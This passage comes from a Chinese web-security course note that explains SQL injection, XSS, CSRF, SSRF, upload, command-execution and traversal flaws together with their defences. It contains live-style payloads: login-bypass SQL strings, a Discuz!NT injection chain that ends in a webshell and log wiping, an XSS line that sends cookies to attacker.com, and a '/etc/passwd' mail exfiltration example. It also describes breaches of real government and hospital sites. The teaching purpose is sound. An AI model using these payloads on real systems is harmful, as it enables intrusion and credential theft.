- <kbd style="color:green;">select * from member where UID =' " request.getPar..("ID") "  ' And 
Passwd =' " request.getP..("Pwd")  " '</kbd>
  - 若攻击者已知系统中已有一个Admin的管理者账号，则输入 <kbd style="color:darkcyan;">Admin '-- ，即可不须输入密码而进入数据库</kbd>
  - <kbd style="color:plum">select * from member where UID =' Admin '-- '  And Passwd =' '</kbd>
    > - 注:  <kbd style="color:red;">--</kbd> <span style="color:blue;">符号后的字符会被当作注释</span> ，因此上例中And子句将被SQL视为注释

### SQL注入实例

<p align="center">
  <img src="./img/SQL注入实例.png"></img>
</p>

- [x] “万能密码”
  - 1："or "a"="a
  - 2：')or('a'='a
  - 3：or 1=1
  - 4：'or 1=1-
  - 5：a'or' 1=1-
  - 6："or 1=1-
  - 7：'or'a'='a
  - 8："or"="a'='a
  - 9：'or''='
  - 10：'or'='or‘

#### SQL注入实例：某县中医院网站

<p align="center">
  <img src="./img/SQL注入实例1.png"></img>
  <img src="./img/SQL注入实例2.png"></img>
</p>

### SQL注入的产生

- [x] <span style="color:red;">动态字符串构建</span>
  - 不正确的处理转义字符
  - 不正确的处理类型
  - 不正确的处理联合查询
  - 不正确的处理错误
  - 不正确的处理多次提交
- [x] <span style="color:red;">不安全的数据库配置</span>
  - 默认预先安装的用户
  - 以root、SYSTEM或者Administrator权限系统用户来运行
  - 默认允许很多系统函数(如xp_cmdshell, OPENROWSET等）

### SQL注入的风险

- [x] 数据表中的<span style="color:blue;">数据外泄</span>，例如个人机密数据、帐户数据、密码等
- [x] <span style="color:blue;">数据结构</span>被黑客获取，得以做进一步攻击(例如 <kbd style="color:red;">SELECT * FROM sys.tables</kbd> )
- [x] 数据库服务器攻击，系统管理员<span style="color:blue;">帐户篡改</span>(例如 <kbd style="color:red;">ALTER LOGIN sa WITH PASSWORD='xxxxxx'</kbd> )
- [x] 取得系统较高权限后，有可能得以在<span style="color:blue;">网页加入恶意链接</span>以及XSS
- [x] 经由数据库服务器提供的操作系统支持，让黑客得以修改或<span style="color:blue;">控制操作系统</span>(例如xp_cmdshell "net stop iisadmin"可停止服务器的IIS服务)

### SQL注入的防护方法

- [x] 代码级防护
  - <span style="color:blue;">验证输入</span>
  - 参数化SQL
  - 输出检查
  - 使用存储过程
- [x] 平台级别防护
  - 在运行期间防护： <span style="color:blue;">使用WAF(Web应用防火墙)、URL重写</span> 等
  - 配置数据库安全策略(权限配置、关闭默认账号、审计等)

### Sql注入类型

- [x] 主要分为<span style="color:blue;">字符型注入和数字型注入</span>，由于编程语言不同，所存在的注入类型也不同
- [x] SQL查询语句中，数据类型的语法有三种：
  - <span style="color:blue;">数字型</span>： SELECT 列FROM 表WHERE <kbd style="color:red;">数字型列=值</kbd>
  - <span style="color:blue;">字符型</span>： SELECT 列FROM 表WHERE <kbd style="color:red;">字符型列=’值’</kbd>
  - <span style="color:blue;">搜索型</span>： SELECT * FROM 表WHERE where <kbd style="color:red;">被搜索的列like ‘%值%’</kbd>

### Sql注入对于不同语言的表现

<!-- tabs:start -->

#### **Asp表现**

- [x] 存在数字型和字符型注入
  - (A) 数字型 字段=51
    - <kbd style="color:red;">Select * from 表名 where 字段=51</kbd>
    - 构造参数：<kbd style="color:red;">ID=49 And [查询条件]</kbd>
    - 生成语句：<kbd style="color:red;">Select * from 表名where 字段=49 And [查询条件]</kbd>
  - (B)字符型的另一种形式
    - 搜索语句：<kbd style="color:red;">Select * from 表名where 字段like '%关键字%'</kbd>
    - 构造参数：<kbd style="color:red;">keyword='and [查询条件] and '%25'='</kbd>
    - 生成语句：<kbd style="color:red;">Select * from 表名where字段like '%' and [查询条件] and '%'='%'</kbd>
 
- [x] Asp注入的预防
  - 对于用户端输入的任意字符，包括GET提交、POST提交、Cookie提交、SERVER提交的都需要做严格过滤
  - 对于数字型参数判断是否为数字：可用函数isNumeric来判断，返回值为true和false
  - 对于字符型参数过滤单引号，使其无法闭合当前sql语句的单引号
  - 例外：base64编码
  - Sql通用防注入

#### **Php表现**

- [x] Php的魔术引号(magic_quotes_gpc) 
  - <span style="color:red;">魔术引号是一个自动将进入PHP脚本的数据进行转义的过程</span>。当打开时，所有的'(单引号)，"(双引号)，\(反斜线)和NULL字符都会被自动加上一个反斜线进行转义
  - php.ini-dist 默认是开启此功能。此时将不会产生字符型注入，主要是数字型注入
- [x] 数字型注入：
  - <kbd style="color:red;">select * from guess where id=“.$id.”</kbd>
  - <kbd style="color:red;">select * from guess where id=$id</kbd>

- [x] GPC不起作用的情况
  - 数组
    ```sql
    $userid=$_POST[userid'];
    for($i=0;$i<count($ userid);$i++){
    $query=“select *  from user where i_hid='".$ userid[$i]."'";
    ```
  - 编码函数引起
    - **base64_decode,base64编码后的单引号：Jw==**
  - mysql处理GBK编码字符%bf%27导致单引号被绕过的问题
  - 其他数据库，如ms sql。对于转义符反斜杠作为字符处理的。
    ```sql
    select * from test where title ='aaa\' or '1'='1‘
    ```

- [x] Php注入的预防
  - `确认GPC开启` ，若没开启则用addslashes函数过滤之，如下代码。
    ```sql
    if (!get_magic_quotes_gpc()) {
      $lastname = addslashes($_POST['lastname']);
    } else {
      $lastname = $_POST['lastname'];
    }
    ```
  - 对于数字型参数可使用intval 或floatval 强制转换为数字型。
  - 注意mysql的版本以及默认字符集，Mysql>4.1
    - 字符集连接字符串:
      ```sql
      mysql_query("SET character_set_connection=$dbcharset,
      character_set_results=$dbcharset, 
      character_set_client=binary;")
      ```
  - Php5以上版本Mysqli扩展预防，参数化查询
    ```sql
    $city = "Amersfoort";
    /* create a prepared statement */
    $stmt = $mysqli->prepare("SELECT District FROM City 
    WHERE Name=?")
    $stmt->bind_param("s", $city);
    $stmt->execute();
    $stmt->bind_result($district);
    $stmt->fetch();
    printf("%s is in district %s\n", $city, $district);
    $stmt->close();
    ```

#### **Jsp表现**

- [x] 由于java语言是强类型语言，所有变量定义前必须声明其类型，因而仅存在字符型的注入
- [x] 字符型注入实例：
  ```sql
  String sql = "select * from tb_name where name='"+varname+"' and passwd='"+varpasswd+"'";
  stmt  =  conn.prepareStatement(sql);
  ```
- [x] 构造参数varpasswd值为： `' or '1' = '1`
- [x] Sql语句经过解析后将是：
  ```sql
  select * from tb_name = '随意' and passwd = '' or '1' = '1';
  ```
- [x] Jsp预防
  - 采用jdbc的prepareStatement查询数据库，并且sql语句中不出现参数，如：
    ```sql
    sqlStr = “select id from info where city=? and open=? order by id desc”;
    stmt = conn.prepareStatement(sqlStr);
    stmt.setString(1,city);
    stmt.setString(2,var1);
    ```

#### **Asp.net表现**

- [x] 开发语言常用的有：vb.net和C#,都属于强类型语言，因而只存在字符型注入。
- [x] 注入原理，与asp的字符型注入一样。
- [x] Asp.net注入预防
  - 使用Ado.net的参数化查询。
    ```sql
    strSQL = "SELECT * FROM Orders WHERE CustomerID = @CustomerID";
    SqlCommand cmd = new SqlCommand(strSQL, cn);//创建一个sqlcommand对象。
    //创建新参数，参数绑定
    cmd.Parameters.AddWithValue("@CustomerID", "ALFKI");
    ```

<!-- tabs:end -->

### sql注入的检测简单流程

<p align="center">
  <img src="./img/sql注入的检测简单流程.png"></img>
</p>

### 一个SQL注入攻击的实例

- [x] SQL注入
  - 一般存在于http://xxx.xxx.xxx/abc.asp?id=XX等带有参数的动态网页
  - 没有对外界输入进行必要的过滤
- [x] 原理不赘述，以一个例子来说明

#### SQL注入漏洞和攻击的例子

- [x] Discuz!NT 2.5 showuser.aspx SQL注入漏洞
  - http://www.educity.cn/labs/648627.html
  - Discuz!NT 2_5_vuln.mht
  - dnt_25_n2.zip
  - webshell.asp.zip
- [x] 运行平台
  - Windows 2003 Server(自带IIS 6.0)
  - SQL Server 2005
  - Discuz!NT 2.5
- [x] 漏洞起因
  - 漏洞是由showuser.aspx文件引起的，该文件的作用是显示论坛的会员列表。由于脚本中对于用来用户排序的ordertype参数未经过滤而直接查询数据库，攻击者可以通过精心构造的ordertype参数进行数据库的写操作
- [x] 漏洞出错提示

<p align="center">
  <img src="./img/漏洞出错提示.png"></img>
</p>

- [x] 漏洞触发路径

<p align="center">
  <img src="./img/漏洞触发路径.png"></img>
</p>

- [x] 漏洞代码分析

<p align="center">
  <img src="./img/漏洞代码分析.png"></img>
</p>

- [x] 漏洞修复分析

<p align="center">
  <img src="./img/漏洞代码分析1.png"></img>
</p>

- [x] 漏洞攻击步骤
  - 新建一个普通用户账号infosec
  - 将infosec提升为管理员权限
    - http://localhost/showuser.aspx?ordertype=desc;update dnt_users set adminid='1',groupid='1' where username='infosec';-
  - 更改上传格式：jpg →aspx
    - http://localhost/showuser.aspx?ordertype=desc;update dnt_attachtypes set extension='aspx' where extension='jpg';-
  - 通过附件上传网页木马
  - 获得webshell
  - 清除痕迹
    - http://localhost/showuser.aspx?ordertype=desc;update dnt_attachtypes set extension='jpg' where extension='asp';-
    - http://localhost/showuser.aspx?ordertype=desc;delete from dnt_adminvisitlog where username='hacker';-
    - http://localhost/showuser.aspx?ordertype=desc;update dnt_users set adminid='',groupid='' where username='hacker';--

- [x] 获得webshell

<p align="center">
  <img src="./img/获得webshell.png"></img>
</p>

### SQL盲注

- `盲注` ：是SQL注入的一种。即在SQL注入过程中，SQL语句执行查询后，<span style="color:blue;">查询数据不能回显到前端页面中</span>，我们需要使用一些特殊的方式来判断或尝试，这个过程称为盲注
- SQL盲注分为两类：
  - `布尔盲注` ：布尔就是True或False，也就是说它只会根据你的注入信息返回 `True或False` ，没有了之前的报错信息
  - `时间盲注` ：界面返回值只有一种True，无论输入任何值返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的 `时间差` 来判断注入的语句是否正确

## XSS漏洞(跨站脚本攻击)

- [x] 跨站脚本(Cross Site Script)，简称XSS，避免与层叠样式表(Cascading Style Sheets, CSS)混淆
- [x] 漏洞原理：XSS漏洞是指，应用程序<span style="color:red;">没有</span>对接收到的<span style="color:blue;">不可信数据</span>经过<span style="color:red;">适当的验证或转义</span>就直接发给<span style="color:blue;">客户端浏览器</span>。XSS是脚本代码注入的一种
- [x] Web浏览器可以执行HTML页面中嵌入的脚本命令，支持多种脚本语言(如JavaScript、VBScript和ActiveX等)。攻击者利用XSS漏洞将恶意脚本代码注入到网页中，<span style="color:blue;">当用户浏览该网页时，便会触发执行恶意脚本</span>

### XSS攻击的原理

- [x] 不同于大多数攻击一般只涉及攻击者和受害者，<span style="color:red;">XSS往往涉及到三方</span>，即<span style="color:blue;">攻击者、被攻击者利用的网站、受害者客户端</span>

<p align="center">
  <img src="./img/XSS攻击的原理.png"></img>
</p>

### XSS攻击的分类

<!-- tabs:start -->

#### **反射型(Reflected XSS)**

- 攻击者通过特定手法，<span style="color:blue;">诱使</span>用户去访问<span style="color:blue;">一个包含恶意代码的URL</span>
- 当受害者点击这些专门设计的链接的时候，<span style="color:blue;">恶意代码会直接在受害者主机上的浏览器执行</span>
- 此类XSS攻击通常出现在网站的搜索栏、用户登录口等地方，常用来<span style="color:blue;">窃取客户端Cookies</span>或进行<span style="color:blue;">钓鱼欺骗</span>

<p align="center">
  <img src="./img/反射型.png"></img>
</p>

#### **存储型(Stored XSS)**

- 攻击者<span style="color:blue;">事先将恶意代码上传或者储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</span>
- 这意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此<span style="color:blue;">存储型XSS攻击的危害会更大</span>
- 此类攻击一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中

<p align="center">
  <img src="./img/存储型.png"></img>
</p>

#### **反射型vs. 存储型**

<p align="center">
  <img src="./img/存储型1.png"></img>
</p>

#### **基于DOM型(DOM-based XSS)**

- [x] 文档对象模型(Document Object Model)，是W3C组织推荐的处理可扩展置标语言的标准编程接口。它是一种与平台和语言无关的应用程序接口(API)，可以<span style="color:blue;">动态地访问程序和脚本，更新其内容</span>、结构和www文档的风格(HTML和XML文档是通过说明部分定义的)

<p align="center">
  <img src="./img/基于DOM型.png"></img>
  <img src="./img/基于DOM型1.png"></img>
</p>

- [x] 构造XSS代码， `修改参数` ，成功执行脚本

<p align="center">
  <img src="./img/基于DOM型2.png"></img>
</p>

- [x] <span style="color:blue;">客户端的脚本程序可以动态地检查和修改页面内容</span>，而<span style="color:blue;">不依赖于服务器端的数据</span>
- [x] 例如客户端如<span style="color:blue;">从URL中提取数据并在本地执行</span>，如果用户在客户端输入的数据包含了恶意的JavaScript脚本，而这些脚本没有经过适当的过滤或者消毒，那么应用程序就可能受到DOM-based型XSS攻击
- [x] 需要特别注意以下的用户输入源document.URL、location.hash、location.search、document.referrer等

<p align="center">
  <img src="./img/基于DOM型3.png"></img>
</p>

<!-- tabs:end -->

### XSS跨站脚本攻击实例

- [x] 解释：当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送 给一个网页浏览器，这就会产生跨站脚本攻击(简称XSS)。
- [x] XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向至恶意网站。
  - <kbd style="color:red;">'><script>document.location='http://attacker.com/index.php?foo='+document.cookie</script><!--</kbd>这导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。

### XSS风险

- [x] 盗取各类用户帐号，如网银、管理员等帐号
- [x] 欺骗浏览器访问钓鱼网站，以骗取账号密码等个人信息
- [x] 将使用者浏览器导向恶意网站，向使用者计算机下载并安装恶意后门程序

### XSS的防护方法

- `输入验证` ：某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则
- `强壮的输出编码` ：数据输出前，确保用户提交的数据已被正确进行entity编码(\&amp; \&lt; \&gt; \&quot;)，建议对所有字符进行编码而不仅局限于某个子集
- `明确指定输出的编码方式`(如ISO 8859-1或UTF 8)：不要允许攻击者为你的用户选择编码方式
- 将『<』、『>』、『%』、『/』、『()』、『&』等 `符号进行过滤不予输出至网页` ，或限定字段长度的输入；并注意黑名单验证方式的局限性：仅仅查找或替换一些字符(如"<" ">"或类似"script"的关键字)，很容易被XSS变种攻击绕过验证机制
- `对用户输入数据编码` ：
  - Asp:server.htmlencode函数
  - Php:htmlspecialchars函数
  - asp.net:HttpContext.Current.Server.HtmlEncode
  - jsp:默认没有提供过滤方法，需要自写方法。
- `过滤危险的html关键字符` ：
  - 比如：script/iframe等。

### XSS检测

- 搜索关键字
  - Asp:request/
  - Php:$_GET/$_POST/$_COOKIE/$_SERVER
  - Jsp：request.getParameter/request.getCookies
  - Asp.net:Request.QueryString/Form/Cookies/SeverVaiables/

## CSRF和SSRF漏洞

### CSRF(跨站请求伪造)

- [x] Cross-Site Request Forgery 
  - 也被称成为“one click attack”或者session riding，通常缩写为CSRF
  - 是一种<span style="color:blue;">挟制终端用户在当前已登录的Web应用程序上执行非本意的操作</span>的攻击方法
  - 攻击者只要借助少许的社会工程诡计，例如通过电子邮件或者是聊天软件发送的链接，攻击者就能迫使一个Web应用程序的用户去执行攻击者选择的操作

#### CSRF原理

- [x] CSRF攻击的关键因素
  - <span style="color:red;">HTTP协议无连接</span>，WEB服务器与浏览器间的<span style="color:blue;">状态通过Session ID、Cookie等关联</span>
  - 攻击者的目标站点具有持久化授权cookie或者受害者具有当前<span style="color:blue;">会话凭证</span>(如Session cookie等)
  - 大部分情况下浏览器在每次向服务器请求时<span style="color:blue;">自动提交认证凭证</span>(包括Session cookie、Basic authentication header、IP地址、客户侧SSL证书和Windows域认证)在执行关键操作时，没有对用户进行再次确认
- [x] 与XSS区别
  - XSS基于Web网站的漏洞和客户端对网站的信任，<span style="color:blue;">利用客户端窃取cookie等</span>
  - CSRF基于站点对已认证用户的信任，<span style="color:blue;">实现对网站的利用</span>

<p align="center">
  <img src="./img/CSRF原理.png"></img>
  <img src="./img/CSRF原理1.png"></img>
  <img src="./img/CSRF原理2.png"></img>
</p>

#### CSRF风险

- 执行网站会话(转账、登出)
- 访问敏感数据(读取、篡改、添加、删除企业、个人敏感数据)
- 修改账户信息

#### CSRF的防护方法

- 用户
  - 使用Web应用程序之后立即登出
  - **不要让浏览器保存用户名/口令**
  - 不要使用同一个浏览器同时访问敏感的应用程序和随意冲浪
- 开发者
  - 将持久化的授权方法(例如cookie或者HTTP授权)切换为瞬时的授权方法(在每个form中提供隐藏field)
  - 在non-GET请求中使用Security token
  - 不要滥用$_REQUEST类变量

### SSRF(服务器端请求伪造)

- [x] SSRF(Server-Side Request Forgery， `服务器端` 请求伪造)
- [x] SSRF是一种由攻击者构造请求，<span style="color:blue;">由服务器端发起请求的安全漏洞</span>，本质上是属于信息泄露漏洞
- [x] 一般情况下，SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)
- [x] 攻击者想访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因，导致<span style="color:blue;">攻击者无法直接访问主机B</span>
- [x] 而<span style="color:blue;">服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息</span>

<p align="center">
  <img src="./img/SSRF.png"></img>
</p>

- [x] 很多web应用都提供了从其他的服务器上获取数据的功能(百度识图，给出一串URL就能识别出图片)。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器
- [x] SSRF形成的原因大都是由于<span style="color:blue;">服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</span>。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等
- [x] CSRF vs. SSRF
  - CSRF是跨站请求伪造攻击，由 `客户端发起`
  - SSRF是服务器端请求伪造，由 `服务器发起`

#### SSRF漏洞的防御

- `过滤返回信息` ，验证远程服务器对请求的相应，是比较容易的方法。如果Web应用获取某种类型的文件，那么可以在把返回结果展示给用户之前先验证返回信息是否符合标准
- `统一错误信息` ，避免用户根据错误信息来判断远程服务器端口状态
- `限制请求的端口` 为HTTP常用端口，比如80、443、8080、8090
- `黑名单内网IP` ，避免应用被用来获取内网数据，攻击内网
- `禁用不需要的协议` 。仅仅允许HTTP 和HTTPS 请求。可以防止类似于file:// 、 gopher:// 和 ftp:// 等引起的问题

## 其他Web漏洞

### 失效的身份认证和会话管理

- [x] 解释：与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。
  - 1、未进行登录失败处理导致密码可暴力破解
  - 2、任意密码重置

### 功能级访问控制缺失

- [x] 解释：这种漏洞允许攻击者访问未经授权的功能。管理性的功能是这类攻击的主要目标。
  - 表现在：越权操作

### 安全配置错误

- [x] 解释：好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于<span style="color:blue;">许多设置的默认值并不是安全</span>的，因此，必须定义、实施和维护这些设置。这包含了对所有的<span style="color:blue;">软件保持及时地更新</span>，包括所有应用程序的库文件。
- [x] 攻击案例

<!-- tabs:start -->

#### **案例1**

- [x] 应用程序服务器<span style="color:blue;">管理员控制台自动安装后没有被删除</span>。而<span style="color:blue;">默认帐户也没有被改变</span>。攻击者在你的服务器上发现了标准的管理员页面，通过默认密码登录，从而接管了你的服务器。
- [x] CVE-2009-3548
  - 受该漏洞影响的Tomcat版本如果在安装时不更改，那么<span style="color:blue;">Tomcat默认会建立一个名为“admin”、密码为空的具有管理权限的账号</span>

<p align="center">
  <img src="./img/安全配置错误1.png"></img>
</p>

#### **案例2**

- [x] <span style="color:blue;">目录列表</span>在你的服务器上<span style="color:blue;">未被禁用</span>。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到登录的配置文件，拿到账户信息。

<p align="center">
  <img src="./img/安全配置错误2.png"></img>
</p>

#### **案例3**

- [x] 应用服务器配置<span style="color:blue;">允许堆栈跟踪返回给用户</span>，这样就暴露了潜在的漏洞。攻击者热衷于收集<span style="color:blue;">错误消息里供的额外信息</span>。

<p align="center">
  <img src="./img/安全配置错误3.png"></img>
</p>

<!-- tabs:end -->

### Web漏洞：某省地震局网站

<p align="center">
  <img src="./img/Web漏洞.png"></img>
  <img src="./img/Web漏洞1.png"></img>
</p>

#### PhpMyAdmin远程登录数据库

- [x] 典型弱密码
- [x] 用户名和密码都是root

<p align="center">
  <img src="./img/PhpMyAdmin远程登录数据库.png"></img>
</p>

#### 查看用户名密码

<p align="center">
  <img src="./img/查看用户名密码.png"></img>
</p>

#### 查看弱密码

<p align="center">
  <img src="./img/查看弱密码.png"></img>
</p>

#### 测试弱密码

<p align="center">
  <img src="./img/测试弱密码.png"></img>
</p>

#### 测试成功

<p align="center">
  <img src="./img/测试成功.png"></img>
</p>

### 破译加解密算法

- [x] 明文：123      密文：4e4d4c
- [x] 设明文是m，密文是c
  - m:  1 - 49   2 - 50   3 - 51
  - c : 4e - 78  4d - 77  4c - 76
- [x] 猜测：ASCII码转换+线性算法
  - 设解密算法是m = ac + b，代入值求解，计算出a = -1; b = 127，即解密算法：m = 127 – c
- [x] admin密码的密文：4a4f495a562107070507
- [x] 依次进行解密
  - c:  4a - 74  4f - 79  49 - 73   5a - 90
  - m:  53 - 5   48 - 0   54 - 6    37 - %
- [x] admin密码明文：506%)^xxzx

### 用系统管理员帐号登陆后台(略)

### 使用含有已知漏洞的组件

- [x] 解释：<span style="color:red;">组件</span>，比如：库文件、框架和其它软件模块，几乎总是<span style="color:red;">以全部的权限运行</span>。如果一个<span style="color:red;">带有漏洞的组件被利用</span>，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，并使一系列可能的攻击和影响成为可能。
  - JAVA反序列化
    - 利用Apache Commons Collections这个常用的Java库来实现任意代码执行
    - 影响：Jboss(WildFly)、Weblogic、WebSphere
  - CVE-2016-1019 Adobe flash player 漏洞有可能允许攻击者获得此系统的最高控制权
  - CVE-2016-0785  struts2远程代码执行漏洞

### 未验证的重定向和转发

- 解释：Web应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果<span style="color:red;">没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面</span>。
- 被恶意攻击者用来进行钓鱼攻击，将用户重定向到一个恶意的非法网站，执行攻击并安装恶意文件。

### 敏感信息泄露

- [x] 解释：常见的漏洞是 <span style="color:red;">应该加密的数据不进行加密</span>。在使用加密的情况下，常见的问题是不安全的密钥生成和管理和使用弱算法是很普遍的，特别是 <span style="color:red;">使用弱的哈希算法来保护密码</span>。
  - 1、CVE-2014-0160 OpenSSL 心脏出血 攻击者一次可获得服务器上64K内存中的数据内容
  - 2、CVE-2015-3152 MySQL SSL/TLS连接存在安全漏洞，可遭中间人攻击

### OpenSSL的SM2缓冲区溢出漏洞

- [x] OpenSSL 维护者在2021年8月24日发布了安全提示，披露了代号为CVE-2021-3711 和CVE-20213712 的两个漏洞
- [x] 其中CVE-2021-3711 的问题来自SM2 解密缓冲区溢出，该漏洞存在于OpenSSL 1.1.1 系列中1.1.1k 及之前的版本，在8月12日由John Ouyang 报告，现在已经由Matt Caswell 修复，OpenSSL 维护者建议使用OpenSSL 1.1.1 系列的用户尽快升级到1.1.1l (注意l是字母L的小写形式)版本

### 文件上传漏洞

- [x] 由于对用户上传的 `文件类型判断不完善` ，导致攻击者上传非法类型的文件，从而对网站进行攻击

<p align="center">
  <img src="./img/文件上传漏洞.png"></img>
  <img src="./img/文件上传漏洞1.png"></img>
</p>

- [x] 利用当前系统已有的上传功能，比如文件上传，图像上传等的漏洞来<span style="color:red;">上传任意文件或者webshell</span>
- [x] 危害：直接上传webshell到服务器，甚至获取服务器root权限
- [x] 各种语言表现大同小异

<!-- tabs:start -->

#### **Asp上传漏洞表现**

- [x] 经典的“\0”上传任意后缀文件
  - 假设：filename="c:\nc.exe .bmp"
    ```asp
    'Check the file extension
    if right(tFile,4) <> ".bmp" then exit sub tFile=tFile &".bmp"
    Set FSO = erver.CreateObject("Scripting.FileSystemObject")
    Set FSOFile=FSO.CreateTextFile(FSO.BuildPath(Path, tFile))
    ```

<p align="center">
  <img src="./img/Asp上传漏洞表现.png"></img>
</p>

- [x] Asp上传漏洞预防/检测
  - 检查文件名是否包含'\0'字符。
  - 采用白名单方式允许上传文件类型。
  - 检测关键字：
    `Scripting.FileSystemObject/ADODB.Stream`

#### **Php上传漏洞表现**

```php
$imageinfo = getimagesize($_FILES['userfile']['tmp_name']);
 if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 
'image/jpeg') {
 if($_FILES['userfile']['type'] != "image/gif") {   
echo “仅允许上传GIF和JPEG图片\n"; exit;
 }
 $uploaddir = 'uploads/';
 $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
 if (move_uploaded_file($_FILES['userfile']['tmp_name'],
 $uploadfile)) {
 echo “文件上传成功.\n";
 } else {
 echo “上传失败.\n";
 }
```

- [x] Php上传漏洞预防/检测
  - 检查上传文件名中 `是否存在.php字符` 。
  - 采用白名单，仅允许安全的类型，如gif/jpg/rar等，禁止用户自定义文件后缀。
  - 检测关键字：
    `move_uploaded_file/is_uploaded_file/copy`

#### **Jsp上传漏洞表现**

- [x] 后缀检查不严引起的上传任意文件，主要为jsp和war后缀文件。
- [x] 采用白名单严格限制上传类型。
- [x] 检测方法：
  - ——File/SmartUpload(常用的一个jsp开源上传组件)
  - ——至/WEB-INF/lib/目录下查看相关upload字样的类库，作为关键字搜索。

#### **asp.net上传漏洞表现**

- [x] Asp.net自身提供有上传组件，但默认上传任意后缀文件。
- [x] IIS默认解析的后缀名都是不安全的，采用白名单方式上传文件。
- [x] 检查关键字：
  `PostedFile.FileName/FileUpload`

<!-- tabs:end -->

### 远程命令执行(code execution)

- [x] 通过用户浏览器客户端传送一个命令串给Web server，<span style="color:blue;">web server通过调用shell来执行传过来的命令</span>

- [x] 如果我通过浏览器客户端强行传送一个：restart, shutdown之类的命令给server，结果会是什么样子？结果只是破坏
- [x] 如果传送一个：<span style="color:blue;">mail abc@xxx.com < /etc/passwd</span>，执行结果是什么？结果是将linux系统的passwd文件(linux系统用户信息)发送到指定的邮箱abc@xxx.com

#### 远程命令执行漏洞防范

- **严格限制运行Web服务的用户权限** 。就是说你的Web应用可以访问你的服务器系统的用户权限。一般情况一下，我们应该以白名单的形式介定Web应用可以访问服务器系统的权限。这样控制可以从系统级达到安全防范的效果
- **严格执行用户输入的合法性检查** 。注意这里的输入不一定是你通过表单从键盘输入，往往是Web应用已经内定了某一些操作供您选择，而此时你可以通过Http抓包的方式获取Http请求信息包经改装后重新发送

### 目录遍历(Directory traversal)

- [x] 例如：abc.xxx.net上有网络硬盘服务，当注册用户登录并开通网络硬盘服务后，即可进入自己的硬盘管理界面，我们来看看它是如何进入某一个目录的，以下是进入某一目录的URL：
  - http://abc.xxx.net/Personal_Spaces_List.php?dir=MyFolder
- [x] 那现在把这个URL改装一下：
  - http://abc.xxx.net/Personal_Spaces_List.php?dir=../../../../../../../../../../../../../usr/local/apache/conf/
  - 在浏览器里运行它，会是什么结果呢？
- [x] 结果是：/usr/local/apache/conf/里的所有文件都老老实实的列出来了，通过这种方式，你可以发挥你的想象了，服务器上的东西是不是都差不多可以列出来了？告诉你，还可以随便下载呢！
- [x] 简要的解决方案:
  - 限制Web应用在服务器上的运行
  - 进行严格的输入验证， <span style="color:blue;">控制用户输入非法路径</span>

### Cookie欺骗攻击

- [x] Cookie：Web服务器存放在客户端计算机的一些信息，主要用来客户端识别或身份识别等。Session,保存在服务器端的
- [x] Cookie欺骗攻击：攻击者 <span style="color:blue;">通过修改存放在客户端的cookie来达到欺骗服务器认证目的</span>
- [x] 修改工具：IECookiesView 

#### Cookie攻击原理

```sql
If(“登录验证过程”){
  setcookie("isadmin”,1,time()+3600*24*30);
}//登录成功，写入cookie，一个月后失效，用于下次登录。
……
$admin= $_COOKIE[“isadmin"]; 
if($admin){
  echo “已经登录”;
}else{ echo “请重新登陆”;}
//没对cookie有效性进行验证，导致cookie欺骗产生。
```

#### Cookie欺骗预防

- [x] 禁用cookie，采用session。一般适合web系统安全性要求比较高的情况下——后台管理等。
- [x] 增加多参数验证cookie有效性。——如验证访问者ip是否与上次IP一样等。

#### Cookie欺骗检测

- 关键字检测
  - Asp:Response.Cookies/Request.Cookies
  - Php:Setcookie/$_COOKIE/$HTTP_COOKIE_VARS
  - Jsp:response.addCookie /request.getCookies
  - Asp.net:response.Cookies/request.Cookies 

### Php 文件包含漏洞

- Php：include/require/include_once/require_once函数使用时参数没有限制导致可以包含远程文件或者本地文件。
- Php4存在远程&本地，php5仅存在本地包含。
- 检测：include/require/include_once/require_once
- 其他语言表现。 

### 其他漏洞检测

- 信息泄露
- 权限验证不严
- 仅仅罗列了一些常见的漏洞情况，实际上检测难度将比这个代码复杂的多了，这就要求我们对程序有足够的了解。

### Web漏洞测试平台

- DVWA(Damn Vulnerable Web Application) https://www.vulnspy.com/dvwa/
  - DVWA是一套用PHP+MySQL编写的用于Web漏洞教学和演练的开源免费工具。著名的渗透测试平台Kali Linux中已经集成了该工具
  - DVWA目前的版本共有10个漏洞模块，分别是：
    - Brute Force(暴力破解)
    - CSRF(跨站请求伪造)
    - File Inclusion(文件包含)
    - File Upload(文件上传)
    - SQL Injection(SQL注入)
    - Insecure CAPTCHA(不安全的验证码)
    - XSS (Reflected)(反射型跨站脚本)
    - XSS (Stored)(存储型跨站脚本)
    - Command Injection(命令行注入)
    - SQL Injection (Blind)(SQL盲注)
